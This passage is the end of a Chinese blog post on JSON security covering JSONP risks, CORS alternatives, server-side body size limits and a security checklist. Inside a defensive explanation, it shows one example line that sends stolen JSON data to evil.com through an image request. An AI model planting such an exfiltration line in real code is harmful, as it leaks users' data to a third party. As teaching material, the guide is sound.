+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JSONP 请求</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jsonpCallback</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用户数据:&#x27;</span>, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;https://api.example.com/user?callback=jsonpCallback&#x27;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script)</span><br></pre></td></tr></table></figure>
+
+<p>如果第三方 API 被攻破，它可以返回：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">jsonpCallback</span>(<span class="comment">/* 正常数据 */</span>);</span><br><span class="line"><span class="comment">// 然后注入恶意代码：</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Image</span>()).<span class="property">src</span> = <span class="string">&#x27;https://evil.com/steal?data=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br></pre></td></tr></table></figure>
+
+<h3 id="正确做法-1"><a href="#正确做法-1" class="headerlink" title="正确做法"></a>正确做法</h3><p><strong>不用 JSONP，用 CORS + fetch：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ✅ 现代方案</span></span><br><span class="line"><span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;https://api.example.com/user&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>()</span><br></pre></td></tr></table></figure>
+
+<p>如果必须用 JSONP（比如兼容老旧 API）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ✅ 设置超时和清理</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jsonp</span>(<span class="params">url, timeout = <span class="number">5000</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> callbackName = <span class="string">&#x27;jsonp_&#x27;</span> + <span class="title class_">Date</span>.<span class="title function_">now</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">window</span>[callbackName] = <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(data)</span><br><span class="line">      <span class="title function_">cleanup</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;JSONP 超时&#x27;</span>))</span><br><span class="line">      <span class="title function_">cleanup</span>()</span><br><span class="line">    &#125;, timeout)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">cleanup</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">delete</span> <span class="variable language_">window</span>[callbackName]</span><br><span class="line">      <span class="built_in">clearTimeout</span>(timer)</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(script)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">    script.<span class="property">src</span> = url + (url.<span class="title function_">includes</span>(<span class="string">&#x27;?&#x27;</span>) ? <span class="string">&#x27;&amp;&#x27;</span> : <span class="string">&#x27;?&#x27;</span>) + <span class="string">&#x27;callback=&#x27;</span> + callbackName</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="5-服务端-JSON-解析的安全实践"><a href="#5-服务端-JSON-解析的安全实践" class="headerlink" title="5. 服务端 JSON 解析的安全实践"></a>5. 服务端 JSON 解析的安全实践</h2><h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 限制 JSON body 大小</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>(&#123; <span class="attr">limit</span>: <span class="string">&#x27;1mb&#x27;</span> &#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者手动限制</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">headers</span>[<span class="string">&#x27;content-length&#x27;</span>] &gt; <span class="number">1024</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">413</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;请求体太大&#x27;</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Java（Spring-Boot）"><a href="#Java（Spring-Boot）" class="headerlink" title="Java（Spring Boot）"></a>Java（Spring Boot）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// application.yml</span></span><br><span class="line">spring:</span><br><span class="line">  servlet:</span><br><span class="line">    multipart:</span><br><span class="line">      max-request-size: 1MB</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 或者全局配置</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureMessageConverters</span><span class="params">(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters)</span> &#123;</span><br><span class="line">        <span class="type">MappingJackson2HttpMessageConverter</span> <span class="variable">converter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MappingJackson2HttpMessageConverter</span>();</span><br><span class="line">        converter.setObjectMapper(<span class="keyword">new</span> <span class="title class_">ObjectMapper</span>()</span><br><span class="line">            .disable(DeserializationFeature.FAIL_ON_NUMBERS_FOR_ENUMS)</span><br><span class="line">        );</span><br><span class="line">        converters.add(<span class="number">0</span>, converter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="安全-checklist"><a href="#安全-checklist" class="headerlink" title="安全 checklist"></a>安全 checklist</h2><p>用你的 JSON 工具站之前，对照检查一下：</p>
+<table>
+<thead>
+<tr>
+<th>检查项</th>
+<th align="center">状态</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>不使用 eval 解析 JSON</td>
+<td align="center">✅</td>
+<td>用 JSON.parse</td>
+</tr>
+<tr>
+<td>JSON.parse 放在 try-catch 中</td>
+<td align="center">✅</td>
+<td>防止非法 JSON 崩溃</td>
+</tr>
+<tr>
+<td>限制 JSON 大小</td>
+<td align="center">✅</td>
+<td>防止 DoS</td>
+</tr>
+<tr>
+<td>过滤 <strong>proto</strong> 和 constructor</td>
+<td align="center">✅</td>
+<td>防止原型污染</td>
+</tr>
+<tr>
+<td>渲染前净化 HTML 内容</td>
+<td align="center">✅</td>
+<td>防止 XSS</td>
+</tr>
+<tr>
+<td>服务端限制请求体大小</td>
+<td align="center">✅</td>
+<td>双重防护</td>
+</tr>
+<tr>
+<td>不使用 JSONP（用 CORS）</td>
+<td align="center">✅</td>
+<td>新一代方案</td>
+</tr>
+</tbody></table>
+<hr>
+<blockquote>
+<p>需要在线检查你的 JSON 是否安全合法？推荐这个纯前端工具箱：<br><strong><a target="_blank" rel="noopener" href="https://jsonprocess.app/json-validator">JSON 校验工具</a></strong> — 不上传服务器，本地解析，保障数据安全</p>
+<p>全套功能：<strong>格式化 &#x2F; 校验 &#x2F; 压缩 &#x2F; 对比 &#x2F; 转 CSV &#x2F; 代码生成</strong><br><strong><a target="_blank" rel="noopener" href="https://jsonprocess.app/">https://jsonprocess.app</a></strong></p>
+</blockquote>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2026-07-29T15:31:42.961Z" itemprop="dateUpdated">2026-07-29 23:31:42</time>
+</span><br>
+
+
+        
+        本文链接：<a href="<%- url_for(page.path).replace(/index\.html$/, '') %>" target="_blank" rel="external"><%- page.permalink.replace(/index\.html$/, '') %></a>
+        
+    </div>
+    
+    <footer>
+        <a href="http://javahikers.github.io">
+            <img src="/img/logoliu.jpg" alt="javahiker">
+            javahiker
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JSON/" rel="tag">JSON</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/" rel="tag">前端安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%8E%E7%AB%AF%E5%AE%89%E5%85%A8/" rel="tag">后端安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/&title=《JSON 安全性完全指南：XSS 攻击、原型污染与防护方案》 — Javahiker's Homepage&pic=http://javahikers.github.io/img/logoliu.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/&title=《JSON 安全性完全指南：XSS 攻击、原型污染与防护方案》 — Javahiker's Homepage&source=java知识点整理程序员副业创业" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《JSON 安全性完全指南：XSS 攻击、原型污染与防护方案》 — Javahiker's Homepage&url=http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/&via=http://javahikers.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2026/07/29/json-deep-copy-5-ways/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">程序员面试必问：JSON 深拷贝的 5 种实现方式</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        爱你哟~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechatliu.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechatliu.jpg" data-alipay="/img/alipayliu.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>javahiker &copy; 2015 - 2026</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/&title=《JSON 安全性完全指南：XSS 攻击、原型污染与防护方案》 — Javahiker's Homepage&pic=http://javahikers.github.io/img/logoliu.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/&title=《JSON 安全性完全指南：XSS 攻击、原型污染与防护方案》 — Javahiker's Homepage&source=java知识点整理程序员副业创业" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《JSON 安全性完全指南：XSS 攻击、原型污染与防护方案》 — Javahiker's Homepage&url=http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/&via=http://javahikers.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://javahikers.github.io/2026/07/29/json-security-guide-xss-prototype-pollution/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACwUlEQVR42u3cQW7bUAwEUN//0g7QVYHA1gy/6HjxtCrsRNZTAJEZMn084uP573j1yu93/389f/cZHI+NAw8PD2906e9P9+oikvMk1PYmFrcADw8Pb433/sNy9ntwXlry231hwcPDw/tTXtK1Jmduz9828Xh4eHjfw0se5dFHBsXjJP7Aw8PD+wwvjxLOW+227W4DXzw8PLxtXjsA+4Z/L8738PDw8A6m6vkDNx+PzZYGhleLh4eHt8CbxQp5Y90uWrVFIiobeHh4eB/nzVZRZ+OxkzD35Xfh4eHhfYTXFozz1vmkkFzcSjw8PLwFXn657SLU7A8Gcl7yiXh4eHgbvLbZPW+4Z9FwW6Lw8PDw9nizR/AsvMjXrWYl6iLMxcPDwzvmnTzok0Y5X0Kdfc1F2cDDw8Nb4+VR7Gz1Km+v85WvKNTAw8PD+wgvWmMqf/fPzzlbvXopwsPDw1vjtYFpvpR/EhmfLBDg4eHh7fHyqPTeFf+2YLTlBw8PD2+P18YEJwOqNvx9f4VRrIyHh4f3R7yToOE8hjhaQcDDw8Nb4J2EsO8f38m7yeuzTykyGDw8PLyS1y7izy40H/m3peXix4CHh4e3wGsb6Fkj/iyP2TDsoh3Hw8PDu4nXnvTemzLDFKtXeHh4eGu885FV/vV565wvE9R/x4CHh4d3K6+NUGcxRLuMlSTQUdaCh4eHd8ybrQi0rXaShbSrq8XyKx4eHt6tvGh0FIcUswFV27LnTTYeHh7eNi8fTd01vkpKzmxV62jyhoeHh/eYbMK3JeF80eq2DYjZgYeHh/eY/Jf3eXrRBrjtoCt5vSgMeHh4eGu82aXMqtBstFavDuDh4eF9AS8PXtvysLikhYeHh/c1vDz2zYdhs1WDKKvGw8PDW+DlQ6+8tR0umB4393h4eHjbvFl8sDcMy8dgt8368PDw8FLeDxOR990cjAd+AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+lazyScripts.push('//s95.cnzz.com/z_stat.php?id=1277350950&web_id=1277350950')
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
